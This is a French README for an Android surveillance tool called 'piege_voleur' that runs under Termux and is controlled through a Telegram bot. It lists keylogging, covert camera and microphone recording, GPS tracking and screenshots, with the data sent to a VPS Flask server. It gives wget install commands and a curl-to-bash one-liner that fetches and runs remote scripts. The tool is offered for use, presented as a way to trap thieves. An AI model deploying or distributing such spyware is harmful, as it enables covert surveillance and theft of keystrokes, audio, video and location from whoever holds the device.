# piege_voleur

✅ Keylogger (enregistre les frappes clavier et les envoie au VPS)

✅ Capture vidéo (caméra avant/arrière)

✅ Microphone (enregistre l'audio)

✅ GPS (géolocalisation)

✅ Capture d'écran (screenshot)

✅ Bot Telegram (contrôle l'appareil via Telegram)


```
sudo apt update && sudo apt install python3-pip -y
pip3 install flask telebot
python3 server.py
```

## installation sur termux

```bash
wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/install_termux.sh -O install_termux.sh
bash install_termux.sh

wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/keylogger_termux.sh -O keylogger_termux.sh
wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/record_video.sh -O record_video.sh
wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/record_audio.sh -O record_audio.sh
wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/gps_tracker.sh -O gps_tracker.sh
wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/screenshot.sh -O screenshot.sh
wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/telegram_listener.sh -O telegram_listener.sh

chmod +x *.sh
```

## Or automatic script

```bash
curl https://gist.github.com/trh4ckn0n/5dd89485e8860f3cc536cabcfb86f158/raw/56b6a43233194cb0307e200ef44f8e23005eb256/auto.sh | bash | bash
```

```bash
bash telegram_listener.sh &
```


📌 4️⃣ Commandes Telegram Disponibles

Depuis Telegram, envoie :

📌 keylogger → Active le keylogger

📌 video → Enregistre 10 sec de vidéo (caméra arrière)

📌 audio → Enregistre 10 sec de son

📌 gps → Envoie la position GPS

📌 screenshot → Capture l’écran


---

🎯 Résumé

✅ VPS (Flask) : écoute et stocke les données

✅ Android (Termux) : capture vidéo, micro, clavier, GPS, écran

✅ Bot Telegram : contrôle à distance
